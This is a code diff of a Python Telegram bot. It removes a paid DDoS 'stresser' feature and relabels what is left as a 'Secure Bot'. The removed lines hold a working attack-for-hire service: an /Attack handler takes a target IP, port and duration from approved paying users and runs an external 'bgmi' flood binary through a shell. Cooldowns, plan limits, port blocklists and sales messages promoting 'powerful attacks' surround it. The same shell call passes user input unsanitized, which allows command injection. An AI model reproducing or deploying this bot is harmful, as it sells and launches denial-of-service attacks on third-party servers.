@@ -11,76 +11,44 @@ import asyncio
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 from threading import Thread
 
+# Set up asyncio loop
 loop = asyncio.get_event_loop()
 
+# Fetch environment variables securely
 TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 MONGO_URI = os.getenv("MONGODB_URI")
 
 FORWARD_CHANNEL_ID = -1002156421934
 CHANNEL_ID = -1002156421934
-error_channel_id = -1002156421934
+ERROR_CHANNEL_ID = -1002156421934
 
+# Logging configuration
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
+# Database connection
 client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
 db = client['rishi']
 users_collection = db.users
 
+# Initialize bot
 bot = telebot.TeleBot(TOKEN)
 REQUEST_INTERVAL = 1
 
-blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
-
-running_processes = []
-
-
-REMOTE_HOST = '4.213.71.147'  
-async def run_attack_command_on_codespace(target_ip, target_port, duration):
-    command = f"./bgmi {target_ip} {target_port} {duration} 900"
-    try:
-       
-        process = await asyncio.create_subprocess_shell(
-            command,
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
-        )
-        running_processes.append(process)
-        stdout, stderr = await process.communicate()
-        output = stdout.decode()
-        error = stderr.decode()
-
-        if output:
-            logging.info(f"Command output: {output}")
-        if error:
-            logging.error(f"Command error: {error}")
-
-    except Exception as e:
-        logging.error(f"Failed to execute command on Codespace: {e}")
-    finally:
-        if process in running_processes:
-            running_processes.remove(process)
-
-async def start_asyncio_loop():
-    while True:
-        await asyncio.sleep(REQUEST_INTERVAL)
-
-async def run_attack_command_async(target_ip, target_port, duration):
-    await run_attack_command_on_codespace(target_ip, target_port, duration)
-
+# Function to check if a user is an admin
 def is_user_admin(user_id, chat_id):
     try:
         return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
     except:
         return False
 
+# Function to check if a user is approved
 def check_user_approval(user_id):
     user_data = users_collection.find_one({"user_id": user_id})
-    if user_data and user_data['plan'] > 0:
-        return True
-    return False
+    return bool(user_data and user_data.get('plan', 0) > 0)
 
+# Function to send "not approved" message
 def send_not_approved_message(chat_id):
-    bot.send_message(chat_id, "*YOU ARE NOT APPROVED BUY ACESS:-*", parse_mode='Markdown')
+    bot.send_message(chat_id, "*YOU ARE NOT APPROVED! CONTACT ADMIN FOR ACCESS.*", parse_mode='Markdown')
 
 @bot.message_handler(commands=['approve', 'disapprove'])
 def approve_or_disapprove_user(message):
@@ -103,15 +71,6 @@ def approve_or_disapprove_user(message):
     days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
 
     if action == '/approve':
-        if plan == 1:  # Instant Plan 🧡
-            if users_collection.count_documents({"plan": 1}) >= 99:
-                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
-                return
-        elif plan == 2:  # Instant++ Plan 💥
-            if users_collection.count_documents({"plan": 2}) >= 499:
-                bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
-                return
-
         valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
         users_collection.update_one(
             {"user_id": target_user_id},
@@ -129,147 +88,33 @@ def approve_or_disapprove_user(message):
 
     bot.send_message(chat_id, msg_text, parse_mode='Markdown')
     bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
-# Add this global dictionary to track last attack times
-last_attack_time = {}
-
-# Attack command handler with wait time check
-@bot.message_handler(commands=['Attack'])
-def attack_command(message):
-    user_id = message.from_user.id
-    chat_id = message.chat.id
-
-    # Check if the user is approved to use the /attack command
-    if not check_user_approval(user_id):
-        send_not_approved_message(chat_id)
-        return
-
-    # Get current time
-    current_time = time.time()
-
-    # Check if the user has attacked before and whether they need to wait
-    if user_id in last_attack_time:
-        last_attack = last_attack_time[user_id]
-        time_diff = current_time - last_attack
-
-        # Check if the user has to wait
-        if time_diff < 265.78:
-            wait_time = 265.78 - time_diff
-            bot.send_message(chat_id, f"⏳ Please wait {wait_time:.2f} seconds before initiating another attack.", parse_mode='Markdown')
-            return
-
-    # Send the prompt for attack details
-    bot.send_message(chat_id, "*Please provide the details for the attack in the following format:*\n* <host> <port> <time>*", parse_mode='Markdown')
-    bot.register_next_step_handler(message, process_attack_command)
-
-def process_attack_command(message):
-    try:
-        args = message.text.split()
-        if len(args) != 3:
-            bot.send_message(message.chat.id, "*WRONG COMMAND PLEASE /start*", parse_mode='Markdown')
-            return
-        target_ip, target_port, duration = args[0], int(args[1]), args[2]
-
-        # Proceed with attack command execution
-        if target_port in blocked_ports:
-            bot.send_message(message.chat.id, f"*Wrong IP port. Please provide the correct IP port.*", parse_mode='Markdown')
-            return
-
-        # Run attack asynchronously
-        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
-        bot.send_message(message.chat.id, f"*🚀 Attack Initiated! 💥\n\n🗺️ Target IP: {target_ip}\n🔌 Target Port: {target_port}\n⏳ Duration: {duration} seconds*", parse_mode='Markdown')
-
-        # Update the last attack time for the user
-        last_attack_time[user_id] = time.time()
-
-    except Exception as e:
-        logging.error(f"Error in processing attack command: {e}")
-
-def send_not_approved_message(chat_id):
-    bot.send_message(
-        chat_id, 
-        "*🚫 Unauthorized Access! 🚫*\n\n"
-        "*Oops! It seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks, you can:*\n\n"
-        "👉 *Contact an Admin or the Owner for approval.*\n"
-        "🌟 *Become a proud supporter and purchase approval.*\n"
-        "💬 *Chat with an admin now and level up your capabilities!*\n\n"
-        "🚀 *Ready to supercharge your experience? Take action and get ready for powerful attacks!*", 
-        parse_mode='Markdown'
-    )
-
-
-
-def process_attack_command(message):
-    try:
-        args = message.text.split()
-        if len(args) != 3:
-            bot.send_message(message.chat.id, "*WRONG COMMAND PLEASE /start*", parse_mode='Markdown')
-            return
-        target_ip, target_port, duration = args[0], int(args[1]), args[2]
-
-        if target_port in blocked_ports:
-            bot.send_message(message.chat.id, "*Wrong IP port. Please provide the correct IP port.*", parse_mode='Markdown')
-            return
-
-        # Run attack asynchronously
-        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
-
-        # Send attack initiated message
-        bot.send_message(message.chat.id, f"*🚀 Attack Initiated! 💥\n\n🗺️ Target IP: {target_ip}\n🔌 Target Port: {target_port}\n⏳ Duration: {duration} seconds*", parse_mode='Markdown')
-        
-        # Send attack success message
-        bot.send_message(message.chat.id, "ATTACK SEND SUCCESSFULY! 💥🚀")  # New confirmation message
-
-    except Exception as e:
-        logging.error(f"Error in processing attack command: {e}")
-
-def start_asyncio_thread():
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(start_asyncio_loop())
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    # Create a markup object
     markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
 
-  
-    # Create buttons
-    btn1 = KeyboardButton("")
-    btn2 = KeyboardButton("🚀Attack")
-    btn3 = KeyboardButton("")
-    btn4 = KeyboardButton("ℹ️ My Info")
-    btn5 = KeyboardButton("")
-    btn6 = KeyboardButton("")
+    btn1 = KeyboardButton("ℹ️ My Info")
+    btn2 = KeyboardButton("💼 ResellerShip")
+    btn3 = KeyboardButton("Contact Admin ✔️")
 
-    # Add buttons to the markup
-    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
+    markup.add(btn1, btn2, btn3)
 
-    bot.send_message(message.chat.id, "*🚀BOT READY TO ATTACK🚀*", reply_markup=markup, parse_mode='Markdown')
+    bot.send_message(message.chat.id, "*🚀 Welcome to the Secure Bot 🚀*", reply_markup=markup, parse_mode='Markdown')
 
 @bot.message_handler(func=lambda message: True)
 def handle_message(message):
-    if message.text == "Instant Plan 🧡":
-        bot.reply_to(message, "*Instant Plan selected*", parse_mode='Markdown')
-    elif message.text == "🚀Attack":
-        bot.reply_to(message, "*🚀Attack Selected*", parse_mode='Markdown')
-        attack_command(message)
-    elif message.text == "💼ResellerShip":
-        bot.send_message(message.chat.id, "*FOR RESSELER SHIP DM :-*", parse_mode='Markdown')
-    elif message.text == "ℹ️ My Info":
+    if message.text == "ℹ️ My Info":
         user_id = message.from_user.id
         user_data = users_collection.find_one({"user_id": user_id})
 
-        # Fetch user data and display relevant information
         if user_data:
-            username = message.from_user.username
-            plan = user_data.get('plan', 'Not Approved')  # Default to 'Not Approved' if no plan
+            username = message.from_user.username or "No Username"
+            plan = user_data.get('plan', 'Not Approved')
             valid_until = user_data.get('valid_until', 'Not Approved')
-            
-            # Define role based on approval status
             role = 'User' if plan > 0 else 'Not Approved'
 
-            # Format the information message
             response = (
-                f"*👤User Info*\n"
+                f"*👤 User Info*\n"
                 f"🔖 Role: {role}\n"
                 f"🆔 User ID: {user_id}\n"
                 f"👤 Username: @{username}\n"
@@ -277,23 +122,30 @@ def handle_message(message):
             )
         else:
             response = "*No account information found. Please contact the administrator.*"
-        
+
         bot.reply_to(message, response, parse_mode='Markdown')
-    elif message.text == "🤖STRESSER SERVER":
-        bot.reply_to(message, "*🤖STRESSER SERVER RUNNING....*", parse_mode='Markdown')
-    elif message.text == "Contact admin✔️":
-        bot.reply_to(message, "*Contact admin selected*", parse_mode='Markdown')
+
+    elif message.text == "💼 ResellerShip":
+        bot.send_message(message.chat.id, "*For Reseller Ship, Contact Admin!*", parse_mode='Markdown')
+
+    elif message.text == "Contact Admin ✔️":
+        bot.reply_to(message, "*Contact Admin Selected*", parse_mode='Markdown')
+
     else:
         bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')
+
+def start_asyncio_thread():
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(asyncio.sleep(REQUEST_INTERVAL))
 
 if __name__ == "__main__":
     asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
     asyncio_thread.start()
-    logging.info("KRISHNA SERVER RUNNING.....")
+    logging.info("Secure Bot is Running...")
+    
     while True:
         try:
             bot.polling(none_stop=True, interval=3, timeout=20)
         except Exception as e:
             logging.error(f"An error occurred while polling: {e}")
-        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
         time.sleep(REQUEST_INTERVAL)
